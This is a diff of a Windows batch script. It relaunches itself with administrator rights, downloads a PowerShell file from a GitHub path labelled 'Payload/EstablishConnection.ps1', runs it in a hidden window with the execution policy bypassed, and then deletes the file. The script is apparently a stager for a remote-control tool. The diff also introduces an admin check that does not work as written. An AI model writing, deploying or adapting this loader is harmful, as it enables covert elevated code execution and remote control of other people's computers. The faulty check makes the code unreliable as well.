@@ -1,22 +1,25 @@
 @echo off
 
-:: Check for admin privileges
->nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"
-
-:: If not admin, restart script as admin
+:: Check for admin privileges using PowerShell
+powershell -Command "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)" >nul 2>&1
 if %ERRORLEVEL% neq 0 (
-    powershell -command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
+    echo You need administrative privileges to run this script.
+    echo Restarting script with admin rights...
+    powershell -Command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
     exit /b
 )
 
-:: Continue running the script
+:: If script is running with admin rights, continue with execution
 if "%1"=="RunAs_Admin" (
-    :: Run PowerShell as admin and execute your code
-    powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/EstablishConnection.ps1' -OutFile 'EstablishConnection.ps1'"
-    PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -File ".\EstablishConnection.ps1"
-) else (
-    powershell -command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
+    :: Download and execute PowerShell script with admin rights
+    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/EstablishConnection.ps1' -OutFile 'EstablishConnection.ps1'; .\EstablishConnection.ps1"
+    :: Clean up: remove downloaded script if needed
+    del EstablishConnection.ps1
+    exit /b
 )
 
-:: Exit the script
+:: If not running with admin rights, restart script with admin rights
+powershell -Command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
+
+:: End of script
 exit /b
